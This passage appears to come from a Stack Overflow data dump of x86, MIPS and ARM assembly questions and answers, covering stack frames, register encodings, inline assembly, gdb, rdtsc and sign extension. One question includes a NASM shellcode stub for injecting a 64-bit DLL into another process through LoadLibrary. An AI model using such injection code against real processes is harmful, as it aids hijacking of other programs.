__asm__(""MOV [DWORD PTR 0xDEADBEEF], 0x1234"");
</code></pre>

<p>If you are really inclined to use Intel syntax inline assembly within C code compiled with GCC and assembled with GAS, do not forget to also add the following after it, so that the assembler can grok the rest of the (AT&amp;T syntax) assembly generated by GCC:</p>

<pre><code>__asm__("".att_syntax prefix"");
</code></pre>

<p>The reasoning I see for the prefix/noprefix distinction is, that for AT&amp;T syntax, the <code>%</code> prefix is not really needed for registers on Intel architecture, because registers are named.  But for uniformity it can be there because some other architectures (i.e. SPARC) have numbered registered, in which case specifying a low number alone would be ambiguous as to whether a memory address or register was meant.</p>
","549428"
"What does EBP+8 in this case in OllyDbg and Assembler mean?","7140","","<p>I am just learning Assembler and debugging skills in OllyDbg in order to learn how to use undocumented functions. Now I am having the following problem:</p>

<p>I have the following code part (from OllyDbg):</p>

<pre><code>MOV EDI,EDI
PUSH EBP
MOV EBP,ESP
MOV EAX, DWORD PTR SS:[EBP+8]
XOR EDX,EDX
LEA ECX, DWORD PTR DS:[EAX+4]
MOV DWORD PTR DS:[EAX], EDX
MOV DWORD PTR DS:[ECX+4],ECX
MOV DWORD PTR DS:[ECX],ECX
MOV DWORD PTR DS:[EAX+C],ECX
MOV ECX, DWORD PTR SS:[EBP+C]
</code></pre>

<p>This is the beginning of the function and the goal is to find the data structure. So I figured out that it first pushes the EBP on the stack and then move the ESP (current stack pointer) to EBP where I think it now defines a stack frame for the function. Now the tutorial says that in the popular layout the first argument is placed at [EBP+8] and the second at [EBP+C]</p>

<p>This is what I do not understand. How do I know that the first parameter is placed at EBP+8 ?</p>

<p>Hopefully someone can help me!
Thanks!</p>
","<p>What kind of ""undocumented functions"" do you mean? Assembly is just compiled high-level code most of the time. There's hardly anything ""undocumented"" about it.</p>

<p><code>EBP</code> is most often used as the stack frame pointer in functions, most notably in the C calling convention (also known by the name <code>cdecl</code>). With this convention, the parameters are passed on the stack in reverse order (e.g. the last parameter is pushed first), and the called  function uses <code>EBP</code> to access them. Based on the code you posted, I think the data structure might be pointed to by the first parameter. Have a look :</p>

<pre><code>MOV EAX, DWORD PTR SS:[EBP+8]
LEA ECX, DWORD PTR DS:[EAX+4]
MOV DWORD PTR DS:[EAX], EDX
MOV DWORD PTR DS:[ECX+4],ECX
MOV DWORD PTR DS:[ECX],ECX
MOV DWORD PTR DS:[EAX+C],ECX
MOV ECX, DWORD PTR SS:[EBP+C]
</code></pre>

<p>The first instruction moves the first argument into <code>EAX</code>. Then an offset of 4 is added to that argument and moved into <code>ECX</code>. Note that this is done by the <code>LEA</code> instruction, which is shorthand for ""Load Effective Address"". It is used for unsigned arithmetic and compilers like to use it when doing pointer arithmetic and adding offsets - so whenever you see this instruction, you should be alarmed that whatever it operates on <em>might</em> be a pointer to a structure. Of course, there's no way to know for sure. Later on we have some <code>MOV</code>s to and from that address, where <code>ECX</code> is used to access memory. The structures, if they exist, would look something like this in C :</p>

<pre><code>struct a { /* pointed to by EAX / [EBP+8] */
    int memb1; /* MOV DWORD PTR DS:[EAX], EDX */
    struct b* memb2; /* LEA ECX, DWORD PTR DS:[EAX+4] */
    int memb3; /* unused? */
    int memb4; /* MOV DWORD PTR DS:[EAX+C],ECX */
};

struct b {
    int memb1; /* MOV DWORD PTR DS:[ECX],ECX */
    int memb2; /* MOV DWORD PTR DS:[ECX+4],ECX */
};
</code></pre>

<p>Hope this clears things up somehow. Reverse-engineering assembly code is a very hard and time-consuming task, especially if you don't have any API calls which would tell you the type of arguments used by the application.</p>
","10861585"
"MIPS Assembly - String (ASCII) Instructions","7138","","<p>I am writing an assembler in C for MIPS assembly (so it converts MIPS assembly to machine code).</p>

<p>Now MIPS has three different instructions: R-Type, I-Type and J-Type. However, in the <code>.data</code>. section, we might have something like <code>message: .asciiz ""hello world""</code>. In this case, how would we convert an ASCII string into machine code for MIPS?</p>

<p>Thanks</p>
","<p>ASCII text is not converted to machine code.  It is stored via the format found on <a href=""http://en.wikipedia.org/wiki/ASCII"" rel=""nofollow noreferrer"">Wikipedia</a>.  </p>

<p><img src=""https://i.stack.imgur.com/OkP6G.png"" alt=""ASCII Code Chart""></p>

<p>MIPS uses this format to store ASCII strings.  As for <code>.asciiz</code> in particular, it is the string plus the NUL character.  So, according to the sheet, A is <code>41</code> in hexadecimal, which is just <code>0100 0001</code> in binary.  But don't forget the NUL character, so: <code>0100 0001 0000</code>.</p>

<p>When storing the string, I'd take <a href=""http://courses.missouristate.edu/KenVollmar/MARS/"" rel=""nofollow noreferrer"">Mars MIPS simulator</a>'s idea and just start the memory section at a known address in memory and make any references to the label <code>message</code> set to that location in memory.</p>

<p>Please note that everything in the data section is neither R-type, I-type, nor J-type. It is just raw data.</p>
","7856973"
"Most Efficient way to set Register to 1 or (-1)","7135","","<p>I am taking an assembly course now, and the guy who checks our home assignments is a very pedantic old-school optimization freak. For example he deducts 10% if he sees:  </p>

<pre><code>mov ax, 0
</code></pre>

<p>instead of:</p>

<pre><code>xor ax,ax
</code></pre>

<p>even if it's only used once.</p>

<p>I am not a complete beginner in assembly programing but I'm not an optimization expert, so I need your help in something (might be a very stupid question but I'll ask anyway):
if I need to set a register value to 1 or (-1) is it better to use:  </p>

<pre><code>mov ax, 1
</code></pre>

<p>or do something like:  </p>

<pre><code>xor ax,ax
inc ax
</code></pre>

<p>I really need a good grade, so I'm trying to get it as optimized as possible. ( I need to optimize both time and code size)</p>
","<p>A quick google for <code>8086 instructions timings size</code> turned up <a href=""http://8086.tk/"" rel=""noreferrer"">http://8086.tk/</a> which seems to have all the timings and sizes for the 8086 (and more) instruction sets.</p>

<p>No doubt you could find official Intel doco on the web with similar information.</p>

<p>For your specific question:</p>

<pre><code>xor ax,ax
inc ax
</code></pre>

<p>takes 3+3=6 clock cycles and 2+1=3 bytes while</p>

<pre><code>mov ax,1
</code></pre>

<p>takes 4 clock cycles and 3 bytes.</p>

<p>So the latter is better in that case.</p>

<hr>

<p>But you need to talk to your educational institute about this guy. 10% for a simple thing like that beggars belief.</p>

<p>You should ask what should be done in the case where you have two possibilities, one faster and one shorter.</p>

<p>Then, once they've admitted that there are different ways to code depending on what you're trying to achieve, tell them that what you're trying to achieve is readability and maintainability and seriously couldn't give a flying leap about a wasted cycle or byte here or there<sup>*a</sup>.</p>

<p>Optimisation is something you generally do if and when you have a performance problem, after a piece of code is in a near-complete state - it's almost always wasted effort when the code is still subject to a not-insignificant likelihood of change.</p>

<p>For what it's worth, <code>sub ax,ax</code> appears to be on par with <code>xor ax,ax</code> in terms of clock cycles and bytes, so maybe you could throw that into the mix next time to cause him some more work.</p>

<p><sub><sub>*a) No, don't really, but it's fun to vent occasionally :-)</sub></sub></p>
","2827027"
"What are the ESP and the EBP registers?","7133","","<p>I found that the ESP register is the current stack pointer and EBP is the base pointer for the current stack frame. However, I don't understand these definitions (I am just starting to learn how to code in assembler). </p>

<p>What I understand is that ESP points towards the stack itself and EBP points towards whatever is on top of the stack. But these are just my guesses and they are most likely incorrect. Otherwise, what would a statement like the following mean?</p>

<pre><code>MOV EBP, ESP    
</code></pre>

<p>EDIT : I think the statement above is a typo of my book. I think it should be EBX instead of EBP</p>
","<p>esp is the stack pointer, ebp is/was for a stack frame so that when you entered a function ebp could get a copy of esp at that point, everything on the stack before that happens, return address, passed in parameters, etc and things that are global for that function (local variables) will now be a static distance away from the stack frame pointer for the duration of the function.  esp is now free to wander about as the compiler desires and can be used when nesting to other functions (each needs to preserve the ebp naturally).  </p>

<p>it is a lazy way to manage the stack.  makes compiler debugging a lot easier, makes understanding the code generated by the compiler easier, but burns a register that might have been otherwise general purpose.</p>
","21718937"
"sub eax,0 - does it do anything?","7121","","<p>I just opened a file in IDA Pro and I found some code that looks completely useless. However, I thought it might have some use. Doesn't the <code>sub eax,0</code> just subtract 0 from eax?   </p>

<p>The code:   </p>

<pre><code>hinstDLL= dword ptr  4  
fdwReason= dword ptr  8  
lpReserved= dword ptr  0Ch  

mov     eax, [esp+fdwReason]  
sub     eax, 0  
jz      short loc_10001038  
</code></pre>
","<p>The <code>sub</code> instruction sets flags (<code>OF</code>, <code>SF</code>, <code>ZF</code>, <code>AF</code>, <code>PF</code>, and <code>CF</code>, according to the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"" rel=""noreferrer"">documentation</a>) - the <code>mov</code> instruction does not.  The <code>jz</code> will jump only if the zero flag (<code>ZF</code>) is set, so if you want to jump based on the value in <code>eax</code> that flag has to be set appropriately.</p>
","9791557"
"How to push a 64bit int in NASM?","7119","","<p>I'm trying to push a 64bit integer but when assembling NASM seems to want to see it as a DWORD not a QWORD.</p>

<p>I'm using ASM to create the shellcode I need to inject a 64bit DLL into a 64bit process. The first QWORD is the old instruction pointer, the second is the address containing the address of the DLL, the third is the address of LoadLibrary. The placeholders are filled in at runtime.</p>

<pre><code>section .text
global _start   

_start:
BITS 64
PUSH QWORD 0xACEACEACACEACEAC
PUSHFQ
push rax
PUSH QWORD 0xACEACEACACEACEAC
MOV RAX, 0xACEACEACACEACEAC
CALL RAX
pop RAX
POPFQ
RETN
</code></pre>
","<p>There is no <code>push imm64</code> instruction. As a workaround you can do one of the following:</p>

<ol>
<li>go through a register: <code>mov rax, 0xACEACEACACEACEAC; push rax</code></li>
<li>go through memory: <code>push qword [rel foo]</code></li>
<li>write it in two parts: <code>push dword low32; mov dword [rsp+4], high32</code> or <code>sub rsp,8; mov dword [rsp], low32; mov dword [rsp+4], high32</code></li>
<li>use sign-extension if your immediate allows it</li>
</ol>
","16920778"
"How do I read the value of all registers with gdb?","7117","","<p>I am debugging a c program in assembly to understand how the gcc complier works. I want to read my $fs segment register so I use x/x $fs, however it tells me it can't access the memory. How can I get a read out on any register which includes segment, general purpose, and control registers on the i386:86_64?</p>
","<p><code>info registers</code> prints out registers values for me which is what you are asking I think:</p>

<pre><code>(gdb) info registers
rax            0x7ffff7731ec8   140737344904904
rbx            0x0  0
rcx            0x0  0
rdx            0x7fffffffd618   140737488344600
rsi            0x7fffffffd608   140737488344584
rdi            0x1  1
rbp            0x0  0x0
rsp            0x7fffffffd528   0x7fffffffd528
r8             0x7ffff7730300   140737344897792
r9             0x7ffff7dec250   140737351959120
r10            0x7fffffffd390   140737488343952
r11            0x7ffff73d0b50   140737341360976
r12            0x400be0 4197344
r13            0x7fffffffd600   140737488344576
r14            0x0  0
r15            0x0  0
rip            0x402330 0x402330 &lt;main&gt;
eflags         0x246    [ PF ZF IF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
(gdb) 
</code></pre>
","10325582"
"Where can I find x86 register names?","7108","","<p>Where I can find the 80x86 register full names?
I know that EAX means Extended AX.</p>

<p>What is then, the meaning of AX? I.e. is AX an acronym?</p>
","<p><a href=""http://www.swansontec.com/sregisters.html"">Intel Register names and meaning</a></p>
","5125756"
"Hex values of registers? x86","7097","","<pre><code>MOV DL,AL
</code></pre>

<p>""MOV DL"" = B2</p>

<p>But what is the hex byte value for AL? Where are these listed?</p>

<p><strong>I just realized it must be another opcode! Can anyone point me in the right direction?</strong> </p>
","<p>From the <a href=""http://developer.intel.com/design/pentiumii/manuals/243191.htm"" rel=""noreferrer"">Intel Architecture Software Developer's Manual, Volume 2: Instruction Set Reference Manual</a>, Table 3-1. Register Encodings Associated with the +rb, +rw, and +rd Nomenclature, page 3-3:</p>

<pre><code>AL = 0 AX = 0 EAX = 0
CL = 1 CX = 1 ECX = 1
DL = 2 DX = 2 EDX = 2
BL = 3 BX = 3 EBX = 3
AH = 4 SP = 4 ESP = 4
CH = 5 BP = 5 EBP = 5
DH = 6 SI = 6 ESI = 6
BH = 7 DI = 7 EDI = 7
</code></pre>

<hr>

<p>To answer your question (""aha great. I'm having a hard time finding the a list of instructions to move registers into registers. Can you shed any light?""):</p>

<p>First here are some fish: (for 8-bit regs)</p>

<pre><code>8a c0        mov     al, al
8a c1        mov     al, cl
8a c2        mov     al, dl
8a c3        mov     al, bl
8a c8        mov     cl, al
8a c9        mov     cl, cl
8a ca        mov     cl, dl
8a cb        mov     cl, bl
8a d0        mov     dl, al
8a d1        mov     dl, cl
8a d2        mov     dl, dl
8a d3        mov     dl, bl
8a d8        mov     bl, al
8a d9        mov     bl, cl
8a da        mov     bl, dl
8a db        mov     bl, bl
</code></pre>

<hr>

<p>And here's how to get started fishing:</p>

<p>In the intel instruction set manual, look up the MOV instruction, in page 3-402. You will find a table listing various flavors of the MOV instruction, starting with:</p>

<pre><code>88 /r MOV r/m8,r8 Move r8 to r/m8
89 /r MOV r/m16,r16 Move r16 to r/m16
89 /r MOV r/m32,r32 Move r32 to r/m32
8A /r MOV r8,r/m8 Move r/m8 to r8
8B /r MOV r16,r/m16 Move r/m16 to r16
8B /r MOV r32,r/m32 Move r/m32 to r32
</code></pre>

<p>Note how our fish above use the 8A opcode.  As you may guess, r8 is an 8-bit register, and r/m8 can be either an 8-bit register or a byte from memory.  Also note how different MOV opcodes are available for 16- and 32-bit registers and values (r16, r32).  Pages 3-2 to 3-5 explain the various types of arguments you can specify on a MOV instruction.</p>

<p>But, you may say, this doesn't tell you enough about how to construct the following bytes in the instruction.  For that, look at section 2.1 - General Instruction Format, starting at page 2-1.  x86 instructions may be composed of up to 6 byte sequences: prefixes, opcode, ModR/M, SIB, displacement and immediate values.  Our register move instructions are simple, and include only an opcode (8A) and a ModR/M byte.</p>

<p>The breakdown of the ModR/M byte is documented in section 2.4, and in all-encompassing tables in pages 2-5 to 2-6.  The you will find that the ModR/M byte can encode both the source and destination register.  For example, to move from AL to DL you will use the D0 ModR/M value, giving the 8A D0 instruction.</p>
","3829677"
"How to reverse and print a string in assembly language","7097","","<p>So my assignment was to write a program in assembly code that could make a statement, recieve a user inputted string. Print that string then reverse it using the cpu stack and print it again. this is what I have thus far.</p>

<pre><code>INCLUDE Irvine32.inc

.data
buffer byte 20 DUP(0)
byteCount DWORD ?

Question  byte  ""Please enter your name.""  ,0
Greeting byte   ""Hello "" ,0
Statement byte "" Here is your name backwards""

.code
main proc


mov edx , OFFSET Question
call WriteString
call CRLF
Call CRLF

mov edx, OFFSET buffer
mov Ecx, SIZEOF buffer
call ReadString

push edx
mov EDX ,OFFSET greeting
Call WriteString
pop edx
call WriteString
Call CRLF
Call CRLF
</code></pre>

<p>As you can see this successfully accepts a user entered input and displays it but Im really struggling trying to reverse it.</p>

<p>I tried these here that I copied from the book from a chapter about reversing strings.</p>

<pre><code>; Push the name on the stack.

mov ecx,nameSize
mov  esi,0

L1: movzx eax,aName[esi]    ; get character
push eax                ; push on stack
inc  esi
loop L1

; Pop the name from the stack in reverse
; and store it in the aName array.

mov  ecx,nameSize
mov  esi,0

L2: pop  eax                ; get character
mov  aName[esi],al      ; store in string
inc  esi
loop L2

Invoke ExitProcess,0
main endp
end main
</code></pre>

<p>but I get as output nothing.</p>

<p>it says ""hello, (yourname here)""</p>

<p>it says ""this is your name backwards                   ""</p>

<p>ive tried just about every different incarnation of this I can think of and no avail. im at the end of my ""string"" here</p>
","<p>This is against my better judgement since the snippet of code for reversing hasn't even been integrated into the code the original poster created. The variable names differ. A quick and dirty integration of the code is to create a variable <em>nameSize</em> that holds the number of characters read from a call to <em>ReadString</em>. <a href=""http://math.uaa.alaska.edu/~afkjm/cs221/handouts/procedures.pdf"" rel=""nofollow"">ReadString</a> (part of the Irvine32 library) returns the number of characters read in register <em>EAX</em>.</p>

<p>In the <code>.data</code> section add the variable:</p>

<pre><code>nameSize  DWORD ? 
</code></pre>

<p>After the ReadString move contents of <em>EAX</em> register to nameSize. This code:</p>

<pre><code>mov edx, OFFSET buffer
mov Ecx, SIZEOF buffer
call ReadString
</code></pre>

<p>Should be:</p>

<pre><code>mov edx, OFFSET buffer
mov Ecx, SIZEOF buffer
call ReadString
mov nameSize, eax       ; EAX contains number of characters read into buffer
</code></pre>

<p>In the code snippet for reversing code remove the lines off the bottom for the end of procedure etc. These aren't needed since we will do this in our original code.</p>

<pre><code>Invoke ExitProcess,0
main endp
end main
</code></pre>

<p>Everywhere in the string reversal code where we see the variable <em>aName</em> change it to <em>buffer</em> since that is where we placed the user's name. Place that code into our program and use WriteString to print the reversed buffer at the end. The code could look something like:</p>

<pre><code>INCLUDE Irvine32.inc

.data
buffer byte 20 DUP(0)
byteCount DWORD ?
nameSize  DWORD ?

Question  byte  ""Please enter your name.""  ,0
Greeting byte   ""Hello "" ,0
Statement byte "" Here is your name backwards""

.code
main proc

    mov edx , OFFSET Question
    call WriteString
    call CRLF
    Call CRLF

    mov edx, OFFSET buffer
    mov Ecx, SIZEOF buffer
    call ReadString
    mov nameSize, eax

    push edx
    mov EDX ,OFFSET greeting
    Call WriteString
    pop edx
    call WriteString
    Call CRLF
    Call CRLF

    mov  ecx,nameSize
    mov  esi,0

L1: movzx eax,buffer[esi]    ; get character
    push eax                ; push on stack
    inc  esi
    loop L1

    ; Pop the name from the stack in reverse
    ; and store it in the aName array.

    mov  ecx,nameSize
    mov  esi,0

L2: pop  eax                ; get character
    mov  buffer[esi],al      ; store in string
    inc  esi
    loop L2


    mov EDX ,OFFSET buffer
    call WriteString         ; Write the reversed string that is now in buffer

    exit
main ENDP
END
</code></pre>

<p>If you get linking errors, you may not be linking in all the prerequisite libraries. Try adding these lines to the top of your program:</p>

<pre><code>INCLUDE Irvine32.inc
INCLUDELIB Irvine32.lib
INCLUDELIB user32.lib
INCLUDELIB kernel32.lib
</code></pre>

<p>I should point out that this is a very inefficient way to reverse a string if you don't mind destroying the original. It can be done without a secondary buffer on the stack by reversing the string in place.</p>
","33686684"
"What are these seemingly-useless callq instructions in my x86 object files for?","7097","","<p>I have some template-heavy C++ code that I want to ensure the compiler optimizes as much as possible due to the large amount of information it has at compile time. To evaluate its performance, I decided to take a look at the disassembly of the object file that it generates. Below is a snippet of what I got from <code>objdump -dC</code>:</p>

<pre><code>0000000000000000 &lt;bar&lt;foo, 0u&gt;::get(bool)&gt;:
   0:   41 57                   push   %r15
   2:   49 89 f7                mov    %rsi,%r15
   5:   41 56                   push   %r14
   7:   41 55                   push   %r13
   9:   41 54                   push   %r12
   b:   55                      push   %rbp
   c:   53                      push   %rbx
   d:   48 81 ec 68 02 00 00    sub    $0x268,%rsp
  14:   48 89 7c 24 10          mov    %rdi,0x10(%rsp)
  19:   48 89 f7                mov    %rsi,%rdi
  1c:   89 54 24 1c             mov    %edx,0x1c(%rsp)
  20:   e8 00 00 00 00          callq  25 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x25&gt;
  25:   84 c0                   test   %al,%al
  27:   0f 85 eb 00 00 00       jne    118 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x118&gt;
  2d:   48 c7 44 24 08 00 00    movq   $0x0,0x8(%rsp)
  34:   00 00 
  36:   4c 89 ff                mov    %r15,%rdi
  39:   4d 8d b7 30 01 00 00    lea    0x130(%r15),%r14
  40:   e8 00 00 00 00          callq  45 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x45&gt;
  45:   84 c0                   test   %al,%al
  47:   88 44 24 1b             mov    %al,0x1b(%rsp)
  4b:   0f 85 ef 00 00 00       jne    140 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x140&gt;
  51:   80 7c 24 1c 00          cmpb   $0x0,0x1c(%rsp)
  56:   0f 85 24 03 00 00       jne    380 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x380&gt;
  5c:   48 8b 44 24 10          mov    0x10(%rsp),%rax
  61:   c6 00 00                movb   $0x0,(%rax)
  64:   80 7c 24 1b 00          cmpb   $0x0,0x1b(%rsp)
  69:   75 25                   jne    90 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x90&gt;
  6b:   48 8b 74 24 10          mov    0x10(%rsp),%rsi
  70:   4c 89 ff                mov    %r15,%rdi
  73:   e8 00 00 00 00          callq  78 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x78&gt;
  78:   48 8b 44 24 10          mov    0x10(%rsp),%rax
  7d:   48 81 c4 68 02 00 00    add    $0x268,%rsp
  84:   5b                      pop    %rbx
  85:   5d                      pop    %rbp
  86:   41 5c                   pop    %r12
  88:   41 5d                   pop    %r13
  8a:   41 5e                   pop    %r14
  8c:   41 5f                   pop    %r15
  8e:   c3                      retq   
  8f:   90                      nop
  90:   4c 89 f7                mov    %r14,%rdi
  93:   e8 00 00 00 00          callq  98 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x98&gt;
  98:   83 f8 04                cmp    $0x4,%eax
  9b:   74 f3                   je     90 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x90&gt;
  9d:   85 c0                   test   %eax,%eax
  9f:   0f 85 e4 08 00 00       jne    989 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x989&gt;
  a5:   49 83 87 b0 01 00 00    addq   $0x1,0x1b0(%r15)
  ac:   01 
  ad:   49 8d 9f 58 01 00 00    lea    0x158(%r15),%rbx
  b4:   48 89 df                mov    %rbx,%rdi
  b7:   e8 00 00 00 00          callq  bc &lt;bar&lt;foo, 0u&gt;::get(bool)+0xbc&gt;
  bc:   49 8d bf 80 01 00 00    lea    0x180(%r15),%rdi
  c3:   e8 00 00 00 00          callq  c8 &lt;bar&lt;foo, 0u&gt;::get(bool)+0xc8&gt;
  c8:   48 89 df                mov    %rbx,%rdi
  cb:   e8 00 00 00 00          callq  d0 &lt;bar&lt;foo, 0u&gt;::get(bool)+0xd0&gt;
  d0:   4c 89 f7                mov    %r14,%rdi
  d3:   e8 00 00 00 00          callq  d8 &lt;bar&lt;foo, 0u&gt;::get(bool)+0xd8&gt;
  d8:   83 f8 04                cmp    $0x4,%eax
</code></pre>

<p>The disassembly of this particular function continues on, but one thing I noticed is the relatively large number of <code>call</code> instructions like this one:</p>

<pre><code>20:   e8 00 00 00 00          callq  25 &lt;bar&lt;foo, 0u&gt;::get(bool)+0x25&gt;
</code></pre>

<p>These instructions, always with the opcode <code>e8 00 00 00 00</code>, occur frequently throughout the generated code, and from what I can tell, are nothing more than no-ops; they all seem to just fall through to the next instruction. This begs the question, then, is there a good reason why all these instructions are generated? </p>

<p>I'm concerned about the instruction cache footprint of the generated code, so wasting 5 bytes many times throughout a function seems counterproductive. It seems a bit heavyweight for a <code>nop</code>, unless the compiler is trying to preserve some kind of memory alignment or something. I wouldn't be surprised if this were the case.</p>

<p>I compiled my code using g++ 4.8.5 using <code>-O3 -fomit-frame-pointer</code>. For what it's worth, I saw similar code generation using clang 3.7.</p>
","<p>The <code>00 00 00 00</code> (relative) target address in <code>e8 00 00 00 00</code> is intended to be filled in by the linker. It doesn't mean that the call falls through. It just means you are disassembling an object file that has not been linked yet.</p>

<p>Also, a call to the next instruction, if that was the end result after the link phase, would not be a no-op, because it changes the stack (a certain hint that this is not what is going on in your case). </p>
","34793585"
"rdtsc, too many cycles","7096","","<pre><code>#include &lt;stdio.h&gt;
static inline unsigned long long tick() 
{
        unsigned long long d;
        __asm__ __volatile__ (""rdtsc"" : ""=A"" (d) );
        return d;
}

int main()
{
        long long res;
        res=tick();

        res=tick()-res;
        printf(""%d"",res);
        return 0;
}
</code></pre>

<p>I have compiled this code with gcc with -O0 -O1 -O2 -O3 optimizations. And I always get 2000-2500 cycles. Can anyone explain the reason for this output? How to spend these cycles?</p>

<p><strike>First function ""tick"" is wrong. This is right</strike>.</p>

<p>Another version of function ""tick""</p>

<pre><code>static __inline__ unsigned long long tick()
{
  unsigned hi, lo;
  __asm__ __volatile__ (""rdtsc"" : ""=a""(lo), ""=d""(hi));
  return ( (unsigned long long)lo)|( ((unsigned long long)hi)&lt;&lt;32 );
}
</code></pre>

<p>This is assembly code for -O3   </p>

<pre><code> .file  ""rdtsc.c""
.section    .rodata.str1.1,""aMS"",@progbits,1
.LC0:
    .string ""%d""
    .text
    .p2align 4,,15
.globl main
    .type   main, @function
main:
    leal    4(%esp), %ecx
    andl    $-16, %esp
    pushl   -4(%ecx)
    pushl   %ebp
    movl    %esp, %ebp
    subl    $40, %esp
    movl    %ecx, -16(%ebp)
    movl    %ebx, -12(%ebp)
    movl    %esi, -8(%ebp)
    movl    %edi, -4(%ebp)
#APP
# 6 ""rdtsc.c"" 1
    rdtsc
# 0 """" 2
#NO_APP
    movl    %edx, %edi
    movl    %eax, %esi
#APP
# 6 ""rdtsc.c"" 1
    rdtsc
# 0 """" 2
#NO_APP
    movl    %eax, %ecx
    movl    %edx, %ebx
    subl    %esi, %ecx
    sbbl    %edi, %ebx
    movl    %ecx, 4(%esp)
    movl    %ebx, 8(%esp)
    movl    $.LC0, (%esp)
    call    printf
    movl    -16(%ebp), %ecx
    xorl    %eax, %eax
    movl    -12(%ebp), %ebx
    movl    -8(%ebp), %esi
    movl    -4(%ebp), %edi
    movl    %ebp, %esp
    popl    %ebp
    leal    -4(%ecx), %esp
    ret
    .size   main, .-main
    .ident  ""GCC: (Debian 4.3.2-1.1) 4.3.2""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>This is CPU</p>

<pre><code>processor   : 0
vendor_id   : GenuineIntel
cpu family  : 15
model       : 4
model name  : Intel(R) Xeon(TM) CPU 3.00GHz
stepping    : 3
cpu MHz     : 3000.105
cache size  : 2048 KB
fdiv_bug    : no
hlt_bug     : no
f00f_bug    : no
coma_bug    : no
fpu     : yes
fpu_exception   : yes
cpuid level : 5
wp      : yes
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss constant_tsc up pebs bts pni
bogomips    : 6036.62
clflush size    : 64
</code></pre>
","<p>I've tried your code on several Linux distros running on different Intel CPUs (admittedly all more recent than the Pentium 4 HT 630 you appear to be using). In all those tests I got values between 25 and 50 cycles.</p>

<p>My only hypothesis that's consistent with all the evidence is that you're running your operating system inside a virtual machine rather than on bare metal, and TSC is getting virtualized.</p>
","8324701"
"How to create a GNU GAS macro that expands to an expression like ""(x+y*240)*2""?","7086","","<p>I'm building a program for ARM Linux using GAS, but I want to do some macros to make my development some more smart. Then I want to know:</p>

<p>How could I do a macro for this: <code>(x+y*240)*2</code>, were <code>x</code> and <code>y</code> are <code>int</code>, that will be used like this:</p>

<pre><code>mov r0, MACRO_SHOULD_BE_CALLED_HERE
</code></pre>

<p>And how could I do a macro that should be called like this:</p>

<pre><code>JUST_MACRO_CALLED_HERE_TO_DO_SOMETHING
</code></pre>

<p>That will just do something that is already defined inside it, like a print function for example.</p>

<p>Also, if I need some arguments on the macro or a function call. How I could do it?</p>

<p><em>PS: <code>r0</code> is an ARM register, like <code>eax</code> of x86</em></p>
","<p><a href=""http://www.ibm.com/developerworks/linux/library/l-gas-nasm.html?ca=dgr-twtrGASvsNASMdth-LX&amp;S_TACT=105AGY83&amp;S_CMP=TWDW#N1025C"" rel=""nofollow noreferrer"">GAS vs NASM comparison - Macros</a> shows ways of doing parametrized macros, but it's simple substitutions.</p>
","3128561"
"assembly cltq and movslq difference","7082","","<p>Chapter 3 of <em><a href=""http://csapp.cs.cmu.edu/"" rel=""nofollow"">Computer Systems A Programmer's Perspective</a> (2nd Edition)</em> mentions that<br>
<code>cltq</code> is equivalent to <code>movslq  %eax, %rax</code>.</p>

<p><strong>Why did they create a new instruction (<code>cltq</code>) instead of just using <code>movslq %eax,%rax</code>?  Isn't that redundant?</strong></p>
","<p><strong>TL;DR</strong>: use <code>cltq</code> when possible, because it's one byte shorter.  That's a very minor advantage (so don't sacrifice anything else to make this happen) but choose <code>eax</code> if you're going to want to sign-extend it a lot.</p>

<p>This is mostly relevant for compiler-writers (compiling signed-integer loop counters indexing arrays);  stuff like sign-extending a loop counter every iteration only happens when compilers don't manage to take advantage of signed overflow being undefined behaviour to avoid it.  Human programmers will just decide what's signed vs. unsigned to save instructions.</p>

<hr>

<h2>The history</h2>

<p>Actually, the 32->64 bit form of <a href=""http://www.felixcloutier.com/x86/MOVSX:MOVSXD.html"" rel=""nofollow noreferrer"">MOVSX, called <code>movslq</code></a> in AT&amp;T syntax, is the new one, new with AMD64.  The Intel-syntax mnemonic is actually MOVSXD.  The opcode is <code>63 /r</code> (so it's 3 bytes including the necessary REX prefix, vs. 4 bytes for 8->64 or 16->64 MOVSX).  AMD repurposed the opcode from ARPL, which doesn't exist in 64bit mode.</p>

<p>To understand the history, remember that <strong>current x86 wasn't designed all at once</strong>.  First there was 16-bit 8086, with not MOVSZ/MOVZX at all, just CBW and CWD.  Then 386 added MOVS/ZX (and wider versions of CBW/CWD for sign-extending within eax or into edx).  Then AMD extended all of that to 64-bit.</p>

<p>The REX versions of the existing MOVSX opcodes still have an 8 or 16bit source, but sign extend all the way to 64 bits instead of just 32.  The operand-size prefix lets you encode <code>movsbw</code>, aka <code>movsx r16, r/m8</code>.  IDK what happens if you use an operand-size prefix and REX.W at the same time.  Or what happens if you use an operand-size prefix with the 16bit source form of MOVSX.  Probably it's just an expensive way to encode MOV, like using <code>63 /r</code> without a REX prefix (which the Intel's insn set manual recommends against).</p>

<hr>

<p><code>cltq</code> (<a href=""http://www.felixcloutier.com/x86/CBW:CWDE:CDQE.html"" rel=""nofollow noreferrer"">aka CDQE</a>) is just the obvious way to extend the existing <code>cwtl</code> (aka CWDE) with a REX.W prefix to promote the operand-size to 64 bits.  The original form of this, <code>cbtw</code> (aka CBW), was in 8086, predating MOVSX, and was the only sane way to sign-extend anything.  Since shifts with immediate count>1 <a href=""http://www.posix.nl/linuxassembly/nasmdochtml/nasmdoca.html"" rel=""nofollow noreferrer"">were a 286 feature</a>, the least bad other option seems to be <code>mov ah, al</code> / <code>mov cl, 7</code> / <code>sar ah, cl</code> to broadcast the sign bit to all positions.</p>

